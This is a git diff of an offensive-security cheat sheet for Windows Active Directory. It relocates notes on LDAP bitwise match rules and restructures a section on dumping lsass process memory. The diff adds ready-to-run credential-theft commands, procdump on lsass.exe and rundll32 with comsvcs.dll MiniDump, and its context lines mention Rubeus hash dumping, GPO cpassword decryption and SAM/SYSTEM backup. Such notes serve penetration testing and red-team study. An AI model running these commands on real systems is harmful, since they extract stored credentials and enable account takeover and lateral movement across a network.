@@ -15,6 +15,15 @@ $ $computers = (New-Object System.DirectoryServices.DirectorySearcher("(&(object
 $ foreach($c in $computers) { echo "$($c.name) ($($c.useraccountcontrol))" }
 ```
 
+The website [LdapWiki](https://ldapwiki.com/wiki/) explains how to write a LDAP query. For instance,
+if we want to use bitwise in ldap queries, we need to use some special arguments.
+
+There are two Bitwise operation Extensible Match Rules.
+```
+1.2.840.113556.1.4.803 which is also referred to as LDAP_MATCHING_RULE_BIT_AND (Bitwise AND)
+1.2.840.113556.1.4.804 which is also referred to as LDAP_MATCHING_RULE_BIT_OR (Bitwise OR)
+```
+
 ![](https://adsecurity.org/wp-content/uploads/2015/08/KerberosUnConstrainedDelegation-PowerShell-DiscoverServers2.png)
 
 With [Rubeus](https://github.com/GhostPack/Rubeus), it's possible to dump the hashes:
@@ -61,17 +70,6 @@ foreach($user in $DomainAdmins) { echo "$($user.displayname) ($($user.samaccount
 ```
 
 
-### LDAP Query structure
-The website [LdapWiki](https://ldapwiki.com/wiki/) explains how to write a LDAP query. For instance,
-if we want to use bitwise in ldap queries, we need to use some splecial arguments.
-
-There are two Bitwise operation Extensible Match Rules.
-```
-1.2.840.113556.1.4.803 which is also referred to as LDAP_MATCHING_RULE_BIT_AND (Bitwise AND)
-1.2.840.113556.1.4.804 which is also referred to as LDAP_MATCHING_RULE_BIT_OR (Bitwise OR)
-```
-
-
 ### Decrypt GPO with cpassword
 ```python
 #!/usr/bin/python
@@ -110,6 +108,7 @@ if __name__ == "__main__":
     main()
 ```
 
+
 ### Use Win32 API in Python
 Download then install the pip package `pywin32` here: [https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32](https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32)
 
@@ -132,12 +131,20 @@ There is various methods to dump the `lsass` process memory:
 - [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
 - TaskManager
 - Rundll32
+- [lsassy](https://github.com/Hackndo/lsassy)
 
 
+#### Procdump
 ```bash
-$ procdump -accepteula -ma lsass.exe lsass.dmp
-$ Powershell -c rundll32.exe "C:\Windows\System32\comsvcs.dll", MiniDump [process ID of lsass.exe] dump.bin full
+procdump -accepteula -ma lsass.exe lsass.dmp
 ```
+
+#### Rundll32 & comsvcs.dll
+```bash
+tasklist /fi "imagename eq lsass.exe"
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> lsass.dmp full
+```
+
 
 ### SAM and SYSTEM backup
 ```bash
@@ -237,11 +244,4 @@ can use the `expand` command:
 ```bash
 expand -f:* "update.msu" "%temp%\\update.msu"
 expand -f:* "%temp%\\update.msu\\update.cab" "%temp%\\update.msu\\update.cab"
-```
-
-
-### Dumping lsass
-```bash
-tasklist /fi "imagename eq lsass.exe"
-rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> lsass.dmp full
 ```
